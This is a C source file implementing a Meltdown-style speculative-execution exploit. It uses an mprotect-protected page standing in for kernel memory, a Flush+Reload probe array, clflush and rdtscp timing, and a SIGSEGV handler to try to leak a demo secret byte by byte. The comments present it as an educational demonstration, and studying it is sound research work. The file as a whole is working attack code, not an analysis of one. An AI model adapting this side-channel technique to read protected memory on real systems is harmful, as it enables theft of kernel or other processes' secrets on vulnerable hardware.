#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <unistd.h>

// -------------------------------
// Constants for the side-channel
// -------------------------------
#define CACHE_HIT_THRESHOLD 80
//   If a memory access takes fewer CPU cycles than this threshold, we assume
//   the data was found in the cache (i.e., it was speculatively fetched).

#define DELTA 1024
//   This is an offset added to the base address in our probe array to reduce
//   the effects of hardware prefetching. Each probe index is spaced out
//   across a different cache line / page boundary.

// -------------------------------
// Global variables
// -------------------------------
static sigjmp_buf jbuf;
//   Used to restore execution flow after a SIGSEGV (segmentation fault).

uint8_t array[256 * 4096];
//   Probe array for Flush+Reload side-channel. Each of the 256 possible byte
//   values maps to a distinct page-aligned slot (256 * 4096 bytes total).

// --------------------------------------------------------------------
// 1. Flush the probe array from cache to ensure it starts in uncached state
// --------------------------------------------------------------------
void flushSideChannel() {
    // Step 1: Write something to each page so that it's physically allocated.
    for (int i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    // Step 2: Use _mm_clflush to flush each line from the CPU cache.
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

// --------------------------------------------------------------------
// 2. Signal handler for SIGSEGV
//    If the code tries to read a protected/unreadable address, we end up here.
//    We then perform a non-local jump back to a safe point.
// --------------------------------------------------------------------
void catch_segv(int sig) {
    (void)sig; // Unused parameter. We just jump back to jbuf context.
    siglongjmp(jbuf, 1);
}

// --------------------------------------------------------------------
// 3. meltdown_asm (simulated):
//    - We add some dummy instructions to encourage out-of-order / speculative
//      execution window.
//    - Then we speculatively read from a restricted address.
//    - If speculation happens, the read byte is used as an index into our probe
//      array, bringing that cache line in and leaving a measurable trace.
// --------------------------------------------------------------------
void meltdown_asm(unsigned long addr) {
    // We use 'volatile' here to discourage the compiler from optimizing away:
    volatile char dummy = 0;

    // Insert a block of no-op arithmetic instructions to consume cycles,
    // possibly increasing the speculative window.
    asm volatile(
        ".rept 400;\n"            // Repeat the following ~400 times
        "add $0x141, %%eax;\n"    // Arbitrary instruction to consume CPU cycles
        ".endr;\n"
        :
        :
        : "eax"
    );

    // The line that triggers an illegal memory access:
    // This will cause a SIGSEGV (if not speculatively bypassed).
    dummy = *(char *)addr;

    // If the CPU speculatively fetched 'dummy' before retiring the illegal load,
    // we use 'dummy' as an index to bring a particular cache line into L1 cache.
    array[dummy * 4096 + DELTA] += 1;
}

// --------------------------------------------------------------------
// 4. reloadSideChannel:
//    After we've attempted a speculative read, we measure access times to each
//    slot in 'array'. Whichever index is cached indicates the speculated value.
// --------------------------------------------------------------------
void reloadSideChannel() {
    int junk = 0;        // Used to prevent compiler from optimizing away rdtscp
    uint64_t time1, time2;
    volatile uint8_t *addr;

    // For each possible byte value 0..255:
    for (int i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];

        // Measure time to read from this slot using rdtscp
        time1 = __rdtscp(&junk);  // Read time-stamp counter (start)
        junk = *addr;             // Actual memory access
        time2 = __rdtscp(&junk) - time1; // Elapsed cycles

        // If access is faster than our threshold, we assume it's cached
        if (time2 <= CACHE_HIT_THRESHOLD) {
            // Print the "leaked" value and ASCII char if printable
            printf("Hit: array[%3d * 4096 + %d] -> %3d (ASCII '%c')\n",
                   i, DELTA, i,
                   (i >= 32 && i <= 126) ? i : '?');
        }
    }
}

// --------------------------------------------------------------------
// main:
//  1) Create a page of memory, store a secret string in it.
//  2) Make that page 'unreadable' via mprotect(PROT_NONE) to simulate
//     "kernel-protected memory."
//  3) For each byte of that secret, try to leak it through meltdown_asm
//     and then measure which probe index was cached.
//  4) If your CPU/OS still allows speculation on such invalid loads,
//     you *may* see the secret. In modern systems, you'll often get no
//     correct leaks (the meltdown mitigations work).
// --------------------------------------------------------------------
int main() {
    // Register signal handler to catch SIGSEGV
    signal(SIGSEGV, catch_segv);

    // (A) Allocate a page of memory (4KB)
    //     Initially with READ|WRITE permissions.
    char *secret_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (secret_page == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    // Write a short "secret" string into that page for demonstration.
    const char *secret_str = "HELLO_MELTDOWN";
    strcpy(secret_page, secret_str);

    // (B) Use mprotect to remove all permissions (PROT_NONE),
    //     simulating a "protected kernel page."
    if (mprotect(secret_page, 4096, PROT_NONE) != 0) {
        perror("mprotect failed");
        return 1;
    }

    size_t secret_len = strlen(secret_str);

    // (C) Try to leak each character of the secret string
    //     by repeatedly triggering meltdown_asm and measuring the cache side-channel.
    for (size_t offset = 0; offset < secret_len; offset++) {
        printf("===== Attempting to leak offset %zu =====\n", offset);

        // We'll try multiple times in case speculation only succeeds rarely.
        for (int round = 0; round < 1000; round++) {
            // Before each round, flush side channel to ensure a clean slate.
            flushSideChannel();

            // Use sigsetjmp to set a recovery point; if meltdown_asm triggers SIGSEGV,
            // we jump back here.
            if (sigsetjmp(jbuf, 1) == 0) {
                // (No error yet)
                meltdown_asm((unsigned long)(secret_page + offset));
            } else {
                // If we get here, it's because SIGSEGV was caught
                // We just keep going, the code flow continues after the jump.
            }
        }

        // After attacking multiple times, reload the probe array
        // to see which byte index was cached (if any).
        reloadSideChannel();
        printf("----------------------------------------\n\n");
    }

    // (D) Clean up: unmap the allocated page
    munmap(secret_page, 4096);

    return 0;
}
